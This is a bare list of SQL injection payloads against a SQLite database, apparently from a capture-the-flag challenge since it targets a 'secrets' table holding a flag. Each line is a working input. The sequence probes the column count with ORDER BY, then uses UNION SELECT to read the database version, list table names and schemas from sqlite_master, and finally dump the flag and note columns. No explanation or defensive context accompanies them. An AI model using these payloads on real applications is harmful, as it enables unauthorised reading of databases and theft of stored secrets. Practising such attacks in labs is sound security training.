 
' ORDER BY 1 --

' ORDER BY 2 --

' UNION SELECT 1,2 --

' UNION SELECT sqlite_version(), 'test' --

' UNION SELECT 'AAA','BBB' --

' UNION SELECT name, type FROM sqlite_master WHERE type='table' --

' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --

' UNION SELECT name, sql FROM sqlite_master WHERE type='table' AND name='secrets' --

' UNION SELECT flag, note FROM secrets --
